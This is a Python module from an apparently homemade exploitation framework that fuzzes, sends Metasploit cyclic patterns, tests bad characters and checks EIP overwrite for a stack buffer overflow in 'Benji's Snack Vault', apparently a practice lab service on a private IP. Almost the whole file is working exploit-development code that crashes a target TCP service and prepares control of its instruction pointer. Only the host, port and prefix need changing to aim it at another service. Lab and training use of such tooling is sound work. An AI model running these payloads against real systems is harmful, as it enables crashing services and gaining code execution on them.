# modules/buffer_overflow/benjis_snack_vault_fuzz.py

import socket
import argparse
import time
import sys
import subprocess
from base_module import BaseModule
from utils import colored

class BenjisSnackVaultFuzz(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "benjis_snack_vault_fuzz"
        self.description = "Fuzzer, pattern sender, and badchar tester for Benji's Snack Vault buffer overflow"

        self.options = {
            "RHOST": {"value": "192.168.107.132", "required": True, "description": "Target IP"},
            "RPORT": {"value": 9999, "required": True, "description": "Target port"},
            "PREFIX": {"value": "MEOW ", "required": True, "description": "Command prefix"},
            "MODE": {
                "value": "fuzz",
                "required": True,
                "description": "Mode: fuzz | pattern | badchars | test_offset"
            },
            "PATTERN_LENGTH": {"value": 3000, "required": False, "description": "Length for pattern mode"},
            "OFFSET": {"value": 0, "required": False, "description": "Offset for badchars/test mode (set after pattern)"},
            "CRLF": {"value": True, "required": False, "description": "Append \\r\\n (yes/no)"}
        }

    def show_help(self):
        print(colored("\nBenji's Snack Vault Fuzzer Help:", "yellow"))
        print("Modes:")
        print("  fuzz          - Incremental A's to find crash point")
        print("  pattern       - Send Metasploit pattern for offset discovery")
        print("  badchars      - Send byte range to find bad characters")
        print("  test_offset   - Test EIP control with BBBB at offset")
        print("\nExample workflow:")
        print("  set MODE fuzz")
        print("  run")
        print("  → note crash size → set MODE pattern → run → get EIP → calculate offset")
        print("  → set OFFSET <number> → set MODE badchars → run → inspect dump")

    def run(self):
        opts = {k: v["value"] for k, v in self.options.items()}
        rhost = opts["RHOST"]
        rport = int(opts["RPORT"])
        prefix = opts["PREFIX"]
        mode = opts["MODE"].lower()
        crlf = opts["CRLF"]

        if mode == "fuzz":
            self._run_fuzz(rhost, rport, prefix, crlf)
        elif mode == "pattern":
            self._run_pattern(rhost, rport, prefix, int(opts["PATTERN_LENGTH"]), crlf)
        elif mode == "badchars":
            if opts["OFFSET"] == 0:
                print(colored("[-] Set OFFSET first (from pattern mode)", "red"))
                return
            self._run_badchars(rhost, rport, prefix, int(opts["OFFSET"]), crlf)
        elif mode == "test_offset":
            if opts["OFFSET"] == 0:
                print(colored("[-] Set OFFSET first", "red"))
                return
            self._test_offset(rhost, rport, prefix, int(opts["OFFSET"]), crlf)
        else:
            print(colored(f"[-] Unknown mode: {mode}", "red"))

    def _send_payload(self, rhost, rport, payload):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((rhost, rport))
            s.send(payload)
            s.close()
            return True
        except Exception as e:
            print(colored(f"[!] Connection failed: {e}", "red"))
            return False

    def _run_fuzz(self, rhost, rport, prefix, crlf):
        print(colored("[*] Fuzzing mode - sending increasing A's", "yellow"))
        for size in range(100, 6000, 200):
            junk = b"A" * size
            payload = prefix.encode() + junk
            if crlf:
                payload += b"\r\n"
            print(f"  [+] Sending {len(payload)} bytes...", end="")
            if self._send_payload(rhost, rport, payload):
                print(" OK")
            else:
                print(colored(" CRASH/REFUSED!", "red"))
                print(colored(f"[!] Potential crash around {size} junk bytes", "green"))
                break
            time.sleep(0.2)

    def _run_pattern(self, rhost, rport, prefix, length, crlf):
        print(colored(f"[*] Pattern mode - generating and sending {length}-byte pattern", "yellow"))
        try:
            pattern = subprocess.check_output(
                f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {length}",
                shell=True
            ).decode().strip().encode()
        except Exception as e:
            print(colored(f"[-] Failed to generate pattern: {e}", "red"))
            return

        payload = prefix.encode() + pattern
        if crlf:
            payload += b"\r\n"

        if self._send_payload(rhost, rport, payload):
            print(colored("[+] Pattern sent. Crash Immunity → note EIP value", "green"))
            print(colored("    Then run: pattern_offset.rb -q <EIP_VALUE> -l <length>", "yellow"))
        else:
            print(colored("[!] Send failed - check target", "red"))

    def _run_badchars(self, rhost, rport, prefix, offset, crlf):
        print(colored("[*] Badchars mode - sending 01-ff after offset", "yellow"))
        badchars = bytearray(b for b in range(1, 256) if b not in [0x00, 0x09, 0x0a, 0x0d])
        junk = b"A" * offset
        eip = b"BBBB"
        payload = prefix.encode() + junk + eip + badchars
        if crlf:
            payload += b"\r\n"

        if self._send_payload(rhost, rport, payload):
            print(colored("[+] Badchars sent. In Immunity:", "green"))
            print("    1. Crash → right-click ESP → Follow in Dump")
            print("    2. Look for mangled/missing bytes after BBBB")
        else:
            print(colored("[!] Send failed", "red"))

    def _test_offset(self, rhost, rport, prefix, offset, crlf):
        print(colored(f"[*] Testing offset {offset} with BBBB", "yellow"))
        junk = b"A" * offset
        eip = b"BBBB"
        padding = b"C" * 200
        payload = prefix.encode() + junk + eip + padding
        if crlf:
            payload += b"\r\n"

        if self._send_payload(rhost, rport, payload):
            print(colored("[+] Sent. In Immunity: check if EIP = 42424242", "green"))
        else:
            print(colored("[!] Send failed", "red"))

    def handle_command(self, cmd):
        cmd_lower = cmd.strip().lower()
        if cmd_lower == "run":
            self.run()
            return
        super().handle_command(cmd)